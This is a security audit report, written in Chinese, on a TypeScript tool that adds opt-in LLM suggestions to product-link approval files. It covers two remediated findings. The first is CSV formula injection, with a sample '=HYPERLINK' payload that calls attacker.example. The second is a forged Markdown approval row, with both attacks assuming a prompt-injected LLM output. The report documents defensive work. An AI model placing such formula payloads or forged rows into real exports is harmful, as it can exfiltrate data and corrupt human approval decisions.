# Link Registry LLM 二层建议安全审计结果

**审计日期:** 2026-07-17

**原始审计结论:** PASS WITH FINDINGS

**修复后状态:** FINDINGS REMEDIATED

**范围:**

- `src/linkRegistry/auditReview.ts`
- `src/cli/linkRegistryAudit.ts`
- `tests/linkRegistryAuditReviewLlm.test.ts`
- `tests/linkRegistryAuditCli.test.ts`
- `docs/superpowers/plans/2026-07-17-link-registry-llm-suggestions.md`
- 关联的一层确定性队列清理文件：`src/linkRegistry/maintenance.ts`、`src/linkRegistry/governanceSession.ts`

## 已验证安全边界

- LLM 建议默认关闭，只在 CLI 显式传入 `--llm-suggestions` 且环境变量可创建 provider 时启用。
- LLM 输出只进入 `llmSuggestion`，不会直接写入 `decision`、`finalSameSkuGroupId`、`finalCategoryName`、`finalProductType`、`finalShortName`。
- 不支持的 LLM action 会降级为 `unavailable`。
- malformed LLM JSON / provider 失败会降级为 unavailable，不会中断审计生成。
- 未发现 LLM 输出直接写入 `config/link-registry-overrides.json` 的路径。
- 未发现 registry 字段可控 provider URL 或读取 LLM API key 的路径。

## Findings

### Medium: CSV 公式注入

**状态:** Remediated

**CWE:** CWE-1236

**攻击路径:**

1. 操作者启用 `--llm-suggestions`。
2. 恶意或被 prompt injection 影响的 LLM 返回合法 JSON，例如 `rationale: "=HYPERLINK(\"https://attacker.example\",\"x\")"`。
3. 系统将该字段写入 CSV 审批产物。
4. 人工用 Excel / Sheets 打开 CSV，公式可能被执行。

**影响:**

可能触发外连 beacon 或 spreadsheet 环境内的数据外带。不会直接写 override。

**最小修复建议:**

对导出到 CSV 的 LLM 字段进行公式前缀中和，覆盖 `=`, `+`, `-`, `@`, tab, CR/LF 等前缀。

**已采取修复:**

`renderLinkRegistryAuditReviewCsv()` 的 CSV cell 输出会对公式风险前缀加前导 apostrophe；新增回归测试证明 `=HYPERLINK(...)`、`+SUM(...)`、`@malicious` 不再以可执行公式前缀进入 CSV。

### Medium: Markdown 审批单结构注入

**状态:** Remediated

**CWE:** CWE-74 / CWE-20 / CWE-116

**攻击路径:**

1. 操作者启用 `--llm-suggestions`。
2. 恶意或被 prompt injection 影响的 LLM 返回合法 JSON，其中 `rationale` 或其他 LLM 文本字段包含换行和伪造字段，例如：

   ```text
   ok
   ## 999. [P1] [entry] injected-row
   reviewKey: entry:902
   internalProductIds: 902
   suggestedShortName: injected
   ```

3. 系统将该文本原样写入 Markdown 审批单。
4. 后续人工若直接将该 Markdown 交给 apply 审批链路解析，行式 parser 可能把注入内容识别为结构化审批字段或伪造 row。

**影响:**

在“启用 LLM、恶意/被劫持输出、人工继续 apply 该 Markdown”的条件下，可能造成审批单结构污染，进而影响后续 override 生成目标。不会在审计生成阶段自动写 override。

**最小修复建议:**

对 LLM 文本字段进行单行化或 Markdown 转义；更稳妥的是把 LLM 建议渲染到 parser 不识别的 display-only block，并增加回归测试证明 `llmRationale` 中的换行字段不会被 `readLinkRegistryAuditReviewApprovalMarkdown()` 解析为审批字段。

**已采取修复:**

LLM 文本字段在进入 `llmSuggestion` 前会将 CR/LF 单行化为显示分隔符，避免在审批 Markdown 中形成新的 `##` row 或 `key: value` 字段。新增回归测试证明伪造 `## 999...`、`reviewKey`、`internalProductIds`、`finalShortName` 不会被 parser 识别为第二条审批 row 或可落地修改。

## Rejected Candidates

| Candidate | Reason |
|---|---|
| LLM 直接写 override | enrichment 只写 `llmSuggestion`，下游 apply parser 不读取 `llm*` 字段作为最终审批字段。 |
| LLM 输出直接覆盖 final 字段 | 测试覆盖 unsupported action 和 happy path，`decision` / `final*` 保持为空。 |
| provider URL SSRF | provider URL 来源于本地环境变量和显式 CLI opt-in，不受 registry 字段控制。 |
| secret leakage | prompt 只发送 bounded row context，API key 只在 provider HTTP header 中使用。 |

## Verification Evidence

- `npx vitest run tests/linkRegistryAuditReviewLlm.test.ts tests/linkRegistryAuditCli.test.ts` passed: 6 tests.
- `npx vitest run tests/linkRegistryAuditReviewLlm.test.ts` passed after remediation: 5 tests, including CSV formula neutralization and Markdown structure injection regression cases.
- 相关链接模块测试 passed: 6 files, 29 tests.
- `npm run build` passed.
- `npm run link-registry:audit -- --llm-suggestions --json` passed;在未配置 provider 时仍输出 7 条高价值待审项且无 `llmSuggestion`。
- LSP diagnostics clean for changed TypeScript files.
- `npm test` full suite not green due to existing unrelated vendor/rental/governance failures observed outside this change scope.

## Stop Condition

用户后续要求“开始修复”。本报告保留原始审计结果，并记录本轮对上述 findings 的修复状态。
